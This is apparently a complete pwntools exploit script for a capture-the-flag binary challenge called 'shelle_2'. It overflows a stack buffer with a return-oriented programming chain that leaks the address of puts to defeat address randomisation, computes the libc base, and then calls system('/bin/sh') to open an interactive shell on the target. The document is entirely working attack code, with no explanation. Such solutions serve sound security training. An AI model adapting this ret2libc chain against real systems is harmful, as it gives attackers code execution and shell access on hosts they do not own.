#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('challenge.ctf.games', 30087)
    else:
        p = elf.process(env = {"LD_PRELOAD": libc.path})

def send_cmd(cmd: bytes):
    p.sendlineafter('notroot:P@Strict-psuedoshell$', cmd)

context.binary = elf = ELF('./shelle_2')
libc = ELF('./libc_2.31.so')

pop_rdi = p64(0x00000000004015f3)
pop_5   = p64(0x00000000004015eb)
pop_4   = p64(0x00000000004015ec)
pop_3   = p64(0x00000000004015ee)

start()

payload = pop_5
payload += b'A'*8*5
payload += pop_4
payload += b'A'*8*4
payload += pop_3
payload += b'A'*8*3
payload += pop_rdi
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.run_cmds)

send_cmd(b'\\'*(0x1e0 + 1) + payload)
send_cmd('exit')

libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts

send_cmd(b'\\'*(0x1e0 + 1) + p64(libc.address + 0x0000000000026b72) + # pop rdi
    p64(next(libc.search(b'/bin/sh'))) + \
    p64(libc.sym.system))

send_cmd('exit')

p.interactive()
p.close()
